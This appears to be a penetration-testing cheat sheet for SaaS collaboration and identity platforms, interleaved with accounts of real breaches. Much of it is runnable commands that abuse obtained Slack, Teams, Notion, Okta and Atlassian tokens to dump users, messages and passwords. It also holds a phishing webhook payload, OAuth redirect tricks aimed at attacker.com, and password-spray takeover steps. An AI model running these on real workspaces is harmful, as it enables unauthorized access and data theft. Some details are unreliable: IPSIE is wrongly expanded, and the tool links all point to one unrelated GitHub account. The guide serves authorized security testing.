# SaaS Security Testing Guide

Security testing for common SaaS platforms - Slack, Microsoft Teams, Notion, Okta, and other collaboration tools.

---

## Slack

### Workspace Enumeration

```bash
# Check if workspace exists
curl -s "https://WORKSPACE.slack.com" | grep -i "sign in"

# Find workspaces from email domain
# Some workspaces allow signup from company email

# Enumerate users via Slack API (if you have token)
curl -s "https://slack.com/api/users.list" \
  -H "Authorization: Bearer xoxb-TOKEN"
```

### Token Types

```
xoxb-* : Bot token (most common in leaks)
xoxp-* : User token (full user permissions)
xoxa-* : App token
xoxs-* : Session token
xoxr-* : Refresh token
```

### Token Abuse

```bash
# Test token validity
curl -s "https://slack.com/api/auth.test" \
  -H "Authorization: Bearer xoxb-TOKEN" | jq

# List channels
curl -s "https://slack.com/api/conversations.list" \
  -H "Authorization: Bearer xoxb-TOKEN" | jq '.channels[].name'

# Read channel history
curl -s "https://slack.com/api/conversations.history?channel=C01234567" \
  -H "Authorization: Bearer xoxb-TOKEN" | jq

# Search messages for secrets
curl -s "https://slack.com/api/search.messages?query=password" \
  -H "Authorization: Bearer xoxp-TOKEN" | jq

# List files
curl -s "https://slack.com/api/files.list" \
  -H "Authorization: Bearer xoxb-TOKEN" | jq '.files[].name'
```

### Automated Token Exploitation with Slackattack

The Slackattack Python script provides automated enumeration capabilities using Slack tokens or cookies obtained during an engagement . It supports Slack's API authentication model and can perform the following operations:

```bash
# Installation
pip install slackattack

# Using a Slack API token
python slackattack.py --token xoxb-1234567890 --list-users
python slackattack.py --token xoxb-1234567890 --list-channels
python slackattack.py --token xoxb-1234567890 --test
python slackattack.py --token xoxb-1234567890 --check-permissions
python slackattack.py --token xoxb-1234567890 --pillage

# Using a user-supplied cookie
python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --list-users
python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --list-channels
python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --pillage
```

The `--pillage` command leverages detect-secrets libraries to automatically find secrets in files and conversations .

### Webhook Exploitation

```bash
# If you find incoming webhook URL
# Can post messages to channel

curl -X POST "https://hooks.slack.com/services/T00/B00/XXXX" \
  -H "Content-Type: application/json" \
  -d '{"text": "Phishing message with <https://attacker.com|legitimate looking link>"}'

# Social engineering via webhook
# Post as "IT Support" or automated system
```

### App Misconfigurations

```
Checks:
1. Apps with excessive permissions (files:read, users:read)
2. Apps installed from unknown sources
3. Workflow webhooks accessible externally
4. Connect apps with broad OAuth scopes
```

---

## Microsoft Teams

### Tenant Enumeration

```bash
# Check if tenant exists
curl -s "https://login.microsoftonline.com/DOMAIN.com/.well-known/openid-configuration"

# Get tenant ID
curl -s "https://login.microsoftonline.com/DOMAIN.com/v2.0/.well-known/openid-configuration" | jq -r '.issuer'

# Check federation status
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@domain.com"
```

### Token Types

```
- Access tokens (JWT) for Graph API
- Refresh tokens (can get new access tokens)
- Teams-specific tokens
```

### Graph API Abuse

```bash
# With valid access token
# List Teams
curl -s "https://graph.microsoft.com/v1.0/me/joinedTeams" \
  -H "Authorization: Bearer TOKEN" | jq

# List channels in a team
curl -s "https://graph.microsoft.com/v1.0/teams/{team-id}/channels" \
  -H "Authorization: Bearer TOKEN" | jq

# Read channel messages
curl -s "https://graph.microsoft.com/v1.0/teams/{team-id}/channels/{channel-id}/messages" \
  -H "Authorization: Bearer TOKEN" | jq

# Search messages
curl -s "https://graph.microsoft.com/v1.0/me/messages?$search=\"password\"" \
  -H "Authorization: Bearer TOKEN" | jq
```

### Real-World Attack: TeamFiltration Campaign (2024-2025)

In December 2024, cybersecurity researchers uncovered a large-scale account takeover campaign codenamed UNK_SneakyStrike that weaponized the TeamFiltration penetration testing framework to breach Microsoft Entra ID (formerly Azure Active Directory) user accounts .

**Campaign Overview:**

The attackers targeted over 80,000 user accounts across hundreds of organizations' cloud tenants, successfully compromising multiple accounts. The activity peaked in early January 2025, with 16,500 accounts targeted in a single day .

**Technical Execution:**

TeamFiltration, released at DEF CON in August 2022, is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring Entra ID accounts . The attackers leveraged:

1. **Microsoft Teams API** for user enumeration within Entra ID environments
2. **AWS infrastructure** distributed across multiple geographic regions to launch password-spraying attacks
3. **Systematic rotation of AWS regions** ensuring each password spraying wave originated from a different server in a new location 

**Attack Pattern:**

The campaign operated in highly concentrated bursts targeting a wide range of users within a single cloud environment, followed by quiet periods lasting approximately four to five days . The attackers attempted to access all user accounts within smaller cloud tenants while focusing only on a subset of users in larger tenants - behavior matching TeamFiltration's advanced target acquisition features designed to filter out less desirable accounts .

**Token Abuse Technique:**

Once TeamFiltration successfully obtained credentials, it exploited a feature in Microsoft's OAuth system called "family refresh tokens" (FRTs). These allow access tokens to be generated for multiple related applications. If an attacker gains access to one app using an FRT, they can potentially access other apps in the same token family without reauthenticating . The framework then automated extraction of chat histories, shared files, and contact lists from compromised Teams accounts .

**Source Geography:**

The three primary source geographies based on the number of IP addresses included the United States (42%), Ireland (11%), and Great Britain (8%) .

**Detection Indicators:**

Proofpoint identified a distinctive user agent for an outdated version of Microsoft Teams used in the attacks, as well as attempts to access specific sign-in applications from devices incompatible with the software .

### Teams Tab Exploitation

```
1. Custom tabs can load external content
2. If tab URL is controllable -> phishing
3. SSO tokens may be passed to tab URLs
4. Check for tabs with sensitive data visible
```

### Incoming Webhook Abuse

```bash
# Post to Teams channel via webhook
curl -H "Content-Type: application/json" \
  -d '{"text": "Test message"}' \
  "https://outlook.office.com/webhook/GUID/IncomingWebhook/..."
```

---

## Notion

### Workspace Discovery

```bash
# Public pages may leak workspace info
https://notion.so/WORKSPACE/page-name

# API access (if token obtained)
curl -s "https://api.notion.com/v1/users/me" \
  -H "Authorization: Bearer secret_TOKEN" \
  -H "Notion-Version: 2022-06-28"
```

### Token Abuse

```bash
# List all pages
curl -s "https://api.notion.com/v1/search" \
  -H "Authorization: Bearer secret_TOKEN" \
  -H "Notion-Version: 2022-06-28" \
  -H "Content-Type: application/json" \
  -d '{"query": ""}' | jq

# Read page content
curl -s "https://api.notion.com/v1/blocks/{block-id}/children" \
  -H "Authorization: Bearer secret_TOKEN" \
  -H "Notion-Version: 2022-06-28" | jq

# Search for sensitive content
curl -s "https://api.notion.com/v1/search" \
  -H "Authorization: Bearer secret_TOKEN" \
  -H "Notion-Version: 2022-06-28" \
  -d '{"query": "password"}' | jq
```

### Real-World Vulnerability: Notion OAuth IDOR (CVE-2025-69207)

A critical Insecure Direct Object Reference (IDOR) vulnerability was identified in Khoj, a self-hostable AI application that integrates with Notion, prior to version 2.0.0-beta.23 .

**Vulnerability Details:**

The flaw existed in the Notion OAuth callback endpoint, which accepted any user UUID without verifying that the OAuth flow was initiated by that user. This allowed attackers to hijack any user's Notion integration by manipulating the state parameter .

**Exploitation Requirements:**

The attack required knowing the target user's UUID, which could be leaked through shared conversations where an AI-generated image was present. Attackers could replace victims' Notion configurations with their own, resulting in data poisoning and unauthorized access to the victim's Khoj search index .

**CVSS Score:** 5.4 (Medium) with vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L 

**Fix:** The vulnerability was fixed in version 2.0.0-beta.23.

### Public Page Enumeration

```bash
# Find public Notion pages via Google dorks
site:notion.so "COMPANY"
site:notion.so/WORKSPACE

# Check sharing settings on discovered pages
# Public pages may expose internal docs
```

---

## Okta / Auth0

### Tenant Enumeration

```bash
# Okta
curl -s "https://COMPANY.okta.com/.well-known/openid-configuration"

# Auth0
curl -s "https://COMPANY.auth0.com/.well-known/openid-configuration"
```

### User Enumeration

```bash
# Okta password reset enumeration
# Different response for valid/invalid users

curl -X POST "https://COMPANY.okta.com/api/v1/authn/recovery/password" \
  -H "Content-Type: application/json" \
  -d '{"username": "test@company.com"}'

# Timing attacks on login
# Valid users may have different response times
```

### OAuth Misconfigurations

```bash
# Check for open redirect in authorize endpoint
https://COMPANY.okta.com/oauth2/v1/authorize?
  client_id=X&
  redirect_uri=https://attacker.com&
  response_type=code

# Check for lax redirect_uri validation
redirect_uri=https://legitimate.com.attacker.com
redirect_uri=https://legitimate.com%40attacker.com
redirect_uri=https://legitimate.com/../attacker.com
```

### Real-World Vulnerability: Okta Authentication Bypass (2024)

In October 2024, Okta addressed an authentication bypass vulnerability that affected accounts with usernames of 52 characters or more .

**Vulnerability Details:**

The security hole could allow attackers to bypass Okta AD/LDAP delegated authentication (DelAuth) using only a username. The flaw was discovered by Okta on October 30, 2024, after lurking in the system for three months .

**Exploitation Preconditions:**

Multiple conditions needed to be met for successful exploitation :
1. A username with 52 characters or more (unusual but possible with email addresses as usernames)
2. The user had previously authenticated, creating a cache of the authentication
3. The cache was used first, which could occur if the AD/LDAP agent was down or unreachable due to high network traffic

**Impact Window:** The vulnerability existed from July 23, 2024, until it was patched on October 30, 2024 .

**Mitigation:** Okta recommended implementing multifactor authentication (MFA) as this was not applied as part of the exploitation preconditions. Customers were advised to check their logs for unusual authentication attempts dating back to July 23 .

### Real-World Incident: Okta Support System Breach (2023)

In October 2023, unknown attackers gained access to Okta's support case management system using stolen credentials .

**Incident Details:**

The intruders were able to view files uploaded by certain Okta customers as part of recent support cases. Within the course of normal business, Okta support asks customers to upload HTTP Archive (HAR) files for troubleshooting, which can contain sensitive data including cookies and session tokens that malicious actors can use to impersonate valid users .

**Impact:**

Identity management company BeyondTrust confirmed it was among the impacted customers. On October 2, 2023, BeyondTrust's security team detected an unauthorized attempt to use an Okta account assigned to one of their engineers to create an administrator account using a valid session cookie stolen from Okta's support system. The team blocked all access and verified that the attacker did not gain access to any systems .

**Timeline Concerns:**

BeyondTrust informed Okta of the breach on October 2 but did not receive an immediate response. Okta's Deputy Chief Information Security Officer stated that the company initially believed BeyondTrust's alert was not a result of a breach in its systems. By October 17, Okta had identified and contained the incident .

**Okta's Recommendation:** Okta recommends sanitizing all credentials and cookies/session tokens within a HAR file before sharing it with support .

### API Token Abuse

```bash
# If you obtain Okta API token
# Can enumerate entire organization

# List users
curl -s "https://COMPANY.okta.com/api/v1/users" \
  -H "Authorization: SSWS TOKEN" | jq

# List groups
curl -s "https://COMPANY.okta.com/api/v1/groups" \
  -H "Authorization: SSWS TOKEN" | jq

# List applications
curl -s "https://COMPANY.okta.com/api/v1/apps" \
  -H "Authorization: SSWS TOKEN" | jq
```

---

## Confluence

### Enumeration

```bash
# Check for public spaces
https://COMPANY.atlassian.net/wiki/spaces

# API endpoints
/rest/api/content
/rest/api/space
/rest/api/user
```

### Exposed Content

```bash
# Search for sensitive content
curl -s "https://COMPANY.atlassian.net/wiki/rest/api/content/search?cql=text~password" \
  -H "Authorization: Basic BASE64_CREDS" | jq

# Export space (if permitted)
curl -s "https://COMPANY.atlassian.net/wiki/rest/api/space/SPACE/content" \
  -H "Authorization: Basic BASE64_CREDS" | jq
```

---

## Jira

### Project Enumeration

```bash
# List projects
curl -s "https://COMPANY.atlassian.net/rest/api/2/project" \
  -H "Authorization: Basic BASE64" | jq '.[].key'

# Search issues
curl -s "https://COMPANY.atlassian.net/rest/api/2/search?jql=text~password" \
  -H "Authorization: Basic BASE64" | jq

# Get issue details
curl -s "https://COMPANY.atlassian.net/rest/api/2/issue/PROJ-123" \
  -H "Authorization: Basic BASE64" | jq
```

---

## Google Workspace

### Drive Enumeration

```bash
# Search shared drives
curl -s "https://www.googleapis.com/drive/v3/files?q=name contains 'password'" \
  -H "Authorization: Bearer TOKEN"

# List shared files
curl -s "https://www.googleapis.com/drive/v3/files?q=sharedWithMe" \
  -H "Authorization: Bearer TOKEN"
```

### Admin API (if admin)

```bash
# List users
curl -s "https://admin.googleapis.com/admin/directory/v1/users?domain=company.com" \
  -H "Authorization: Bearer TOKEN"

# Get user details
curl -s "https://admin.googleapis.com/admin/directory/v1/users/user@company.com" \
  -H "Authorization: Bearer TOKEN"
```

---

## Common Attack Patterns

### Token/Credential Hunting

```bash
# Search GitHub for leaked tokens
"xoxb-" OR "xoxp-" org:company
"hooks.slack.com/services" org:company
"notion.so/api" org:company
"SSWS" "okta.com" org:company

# Search in config files
trufflehog git https://github.com/company/repo
gitleaks detect
```

### Real-World Supply Chain Attack: Salesloft Drift OAuth Token Theft (2025)

In August 2025, a major security incident involving Salesloft's Drift platform demonstrated the catastrophic impact of OAuth token theft through supply chain compromise .

**Incident Overview:**

A threat group tracked by Google as UNC6395 gained access to Salesloft's GitHub account as far back as March 2025. The attackers spent months lurking in the Salesloft application environment, downloading content from multiple repositories, adding a guest user, and setting up workflows through June 2025 .

**OAuth Token Theft:**

The threat actor then accessed Drift's Amazon Web Services environment and obtained OAuth tokens for Drift customers' technology integrations. Using these stolen tokens, the attackers accessed data via Drift integrations, compromising hundreds of organizations .

**Downstream Impact:**

The incident affected a large number of organizations using Drift integrations with Salesforce, Google Workspace, and many other applications. The threat actors stole and replayed OAuth tokens connecting Drift to these platforms, leading to widespread data exfiltration .

**Defense in Practice - Okta's Response:**

When Okta learned of the Salesloft Drift compromise, they immediately reviewed their logs and discovered attempts to use a compromised Salesloft Drift token to access an Okta Salesforce instance. These attempts failed because Okta enforced inbound IP restrictions. The threat actor attempted to use the compromised token from an unauthorized IP address, blocking the attempt before any access could be gained .

**Key Lesson:**

Okta's ability to implement this control was dependent on Salesforce supporting IP restrictions - a feature not available in many SaaS vendors. This incident highlighted the critical need for standardized security controls like the IPSIE (Interoperable Profile for Security Incident Exchange) framework, which provides shared signals for real-time communication of security events and standardized token revocation mechanisms .

### Phishing via Integrations

```
1. Create malicious OAuth app
2. Request permissions from victim
3. Once authorized, access their data
4. Use legitimate-looking app names
```

### Workspace Takeover

```
1. Find admin with weak password
2. Compromise via password spray
3. Add your app/integration
4. Maintain persistence via OAuth
```

---

## Tools

```bash
# SlackPirate - Slack enumeration
https://github.com/AhmedMohamedDev/SlackPirate

# Slackattack - Slack token/cookie exploitation
https://pypi.org/project/slackattack/

# TeamFiltration - Teams/O365 enumeration and ATO
https://github.com/AhmedMohamedDev/TeamFiltration

# ROADtools - Azure AD enumeration
https://github.com/AhmedMohamedDev/ROADtools

# Nuclei templates for SaaS
nuclei -t http/exposures/tokens/
```

---
